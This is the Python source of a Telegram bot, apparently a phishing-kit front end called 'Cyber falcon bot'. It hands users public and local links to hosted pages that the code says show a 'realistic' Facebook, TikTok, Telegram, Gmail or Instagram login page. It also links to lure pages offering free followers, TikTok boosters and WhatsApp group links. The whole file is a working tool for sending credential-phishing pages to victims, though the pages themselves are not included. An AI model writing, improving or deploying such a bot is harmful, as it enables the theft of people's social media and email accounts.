import logging
import requests
import json
import os
from flask import Flask, request, jsonify
from config import TELEGRAM_BOT_TOKEN, PORT

# Flask অ্যাপ (ওয়েবহুক রিসিভ করার জন্য)
app = Flask(__name__)

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

URL_FILE = "saved_url.json"

def save_url(url):
    try:
        with open(URL_FILE, 'w') as f:
            json.dump({'url': url}, f)
    except:
        pass

def load_saved_url():
    try:
        if os.path.exists(URL_FILE):
            with open(URL_FILE, 'r') as f:
                data = json.load(f)
                return data.get('url')
    except:
        pass
    return None

def get_local_ip():
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_public_url():
    saved_url = load_saved_url()
    if saved_url:
        return saved_url
    return os.environ.get('RENDER_EXTERNAL_URL', 'https://fc-bot-b3wy.onrender.com')

# ============= টেলিগ্রাম API হেল্পার =============
def send_telegram_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    try:
        requests.post(url, json=payload, timeout=10)
        print(f"✅ Message sent to {chat_id}")
    except Exception as e:
        print(f"Error sending message: {e}")

def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
    payload = {'chat_id': chat_id, 'message_id': message_id, 'text': text, 'parse_mode': 'Markdown'}
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"Error editing message: {e}")

def answer_callback(callback_id):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
    try:
        requests.post(url, json={'callback_query_id': callback_id}, timeout=10)
    except:
        pass

# ============= বটের মেনু এবং হ্যান্ডলার =============
async def start_bot(chat_id, message_id=None):
    user_name = "User"  # Webhook এ user_name পাওয়া কঠিন, এটা অপশনাল
    
    try:
        requests.get(f"http://localhost:{PORT}/add_user/{chat_id}", timeout=3)
    except:
        pass
    
    public_url = get_public_url()
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🌐 All Mane page", "callback_data": "All_Mane_page"}],
            [{"text": "📢 advance page", "callback_data": "All_advance_page"}],
            [{"text": "🦅 Status", "callback_data": "status"},
             {"text": "🥷 community", "url": "https://t.me/+j8x9Tp4CGa80ZmM1"}]
        ]
    }
    
    message = f"""
😈 🦅𝘾.𝙁 𝘽𝙤𝙩 𝙥𝙧𝙤😈🦅

𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝘾𝙮𝙗𝙚𝙧 𝙛𝙖𝙡𝙘𝙤𝙣 𝙗𝙤𝙩!

🥷𝗦𝘁𝗮𝘁𝘂𝘀: 🟢 𝗔𝗰𝘁𝗶𝘃𝗲
"""
    
    if message_id:
        edit_telegram_message(chat_id, message_id, message, keyboard)
    else:
        send_telegram_message(chat_id, message, keyboard)

def all_menu(chat_id, message_id):
    keyboard = {
        "inline_keyboard": [
            [{"text": "📘 Facebook", "callback_data": "_facebook"}],
            [{"text": "🤤 TikTok", "callback_data": "_tiktok"}],
            [{"text": "✈️ Telegram", "callback_data": "_telegram"}],
            [{"text": "📧 Gmail", "callback_data": "_gmail"}],
            [{"text": "📷 Instagram", "callback_data": "_instagram"}],
            [{"text": "🔙 Back", "callback_data": "main_menu"}]
        ]
    }
    edit_telegram_message(chat_id, message_id, "😈 All Mane page Platforms\n\nSelect a platform:", keyboard)

def advance_menu(chat_id, message_id):
    keyboard = {
        "inline_keyboard": [
            [{"text": "🎯 ফ্রি ফলোয়ার", "callback_data": "_at"}],
            [{"text": "🤖 Ai / গ্রুপ লিংক", "callback_data": "_ai"}],
            [{"text": "📢 TikTok বুস্টার", "callback_data": "_ad"}],
            [{"text": "🚀 TikTok ফলোয়ার", "callback_data": "_go"}],
            [{"text": "🔙 Back", "callback_data": "main_menu"}]
        ]
    }
    edit_telegram_message(chat_id, message_id, "📢 advance page Menu\n\nSelect an option:", keyboard)

def show_page_link(chat_id, message_id, page_name, url_path, back_callback):
    public_url = get_public_url()
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    full_url = f"{public_url}/{url_path}"
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🌐 Open Public URL", "url": full_url}],
            [{"text": "📍 Open Local URL", "url": local_url}],
            [{"text": "🔙 Back", "callback_data": back_callback}]
        ]
    }
    
    message = f"""{page_name}

🌐 **Public URL:**
`{full_url}`

📍 **Local URL:**
`{local_url}`

📘 This link will show a realistic {page_name} login page.
"""
    edit_telegram_message(chat_id, message_id, message, keyboard)

def show_advance_link(chat_id, message_id, title, url_path, back_callback):
    public_url = get_public_url()
    full_url = f"{public_url}/{url_path}"
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🌐 ওপেন পেজ", "url": full_url}],
            [{"text": "🔙 Back", "callback_data": back_callback}]
        ]
    }
    edit_telegram_message(chat_id, message_id, f"{title}\n\n🔗 {full_url}", keyboard)

def show_status(chat_id, message_id):
    public_url = get_public_url()
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    
    keyboard = {"inline_keyboard": [[{"text": "🔙 Back", "callback_data": "main_menu"}]]}
    message = f"""Bot Status

🦅 Bot Status: 🟢 Active
🦅 **Public URL:** `{public_url}`
📍 **Local URL:** `{local_url}`
🔌 **Port:** {PORT}

🛡️ All systems operational."""
    edit_telegram_message(chat_id, message_id, message, keyboard)

def back_to_main(chat_id, message_id):
    start_bot(chat_id, message_id)

# ============= ওয়েবহুক এন্ডপয়েন্ট =============
@app.route(f'/webhook/{TELEGRAM_BOT_TOKEN}', methods=['POST'])
def webhook():
    try:
        update = request.get_json()
        if not update:
            return "ok", 200
        
        # Message handling
        if 'message' in update and 'text' in update['message']:
            chat_id = update['message']['chat']['id']
            text = update['message']['text']
            
            if text in ['/start', '/link']:
                import asyncio
                asyncio.run(start_bot(chat_id))
        
        # Callback query handling
        elif 'callback_query' in update:
            cb = update['callback_query']
            chat_id = cb['message']['chat']['id']
            message_id = cb['message']['message_id']
            data = cb['data']
            callback_id = cb['id']
            
            answer_callback(callback_id)
            
            if data == "All_Mane_page":
                all_menu(chat_id, message_id)
            elif data == "All_advance_page":
                advance_menu(chat_id, message_id)
            elif data == "main_menu":
                back_to_main(chat_id, message_id)
            elif data == "status":
                show_status(chat_id, message_id)
            elif data == "_facebook":
                show_page_link(chat_id, message_id, "😈 Facebook pk Link", "facebook", "All_Mane_page")
            elif data == "_tiktok":
                show_page_link(chat_id, message_id, "🔗 TikTok pk Link", "tiktok", "All_Mane_page")
            elif data == "_telegram":
                show_page_link(chat_id, message_id, "🤧 Telegram pk Link", "telegram", "All_Mane_page")
            elif data == "_gmail":
                show_page_link(chat_id, message_id, "🔗 Gmail pk Link", "gmail", "All_Mane_page")
            elif data == "_instagram":
                show_page_link(chat_id, message_id, "🫂 Instagram pk Link", "instagram", "All_Mane_page")
            elif data == "_at":
                show_advance_link(chat_id, message_id, "🎯 ফ্রি ফেসবুক ফলোয়ার", "facebook_followers", "All_advance_page")
            elif data == "_ai":
                show_advance_link(chat_id, message_id, "🤤 হট হোয়াটসঅ্যাপ গ্রুপ লিংক", "whatsapp_groups", "All_advance_page")
            elif data == "_ad":
                show_advance_link(chat_id, message_id, "📢 TikTok ভিউ+লাইক বুস্টার", "tiktok_boost", "All_advance_page")
            elif data == "_go":
                show_advance_link(chat_id, message_id, "🚀 TikTok ফ্রি ফলোয়ার", "tiktok_followers", "All_advance_page")
        
        return "ok", 200
    except Exception as e:
        print(f"Webhook error: {e}")
        return "ok", 200

@app.route('/health')
def health():
    return "ok", 200

def set_webhook():
    render_url = get_public_url()
    webhook_url = f"{render_url}/webhook/{TELEGRAM_BOT_TOKEN}"
    api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook"
    
    try:
        response = requests.post(api_url, json={'url': webhook_url, 'drop_pending_updates': True})
        if response.status_code == 200 and response.json().get('ok'):
            print(f"✅ Webhook set: {webhook_url}")
            return True
        else:
            print(f"❌ Webhook failed: {response.text}")
            return False
    except Exception as e:
        print(f"❌ Webhook error: {e}")
        return False

def run_bot():
    set_webhook()
    print("🦅 Telegram Bot is ready (Webhook mode)")

if __name__ == '__main__':
    run_bot()
    app.run(host='0.0.0.0', port=PORT, debug=False)
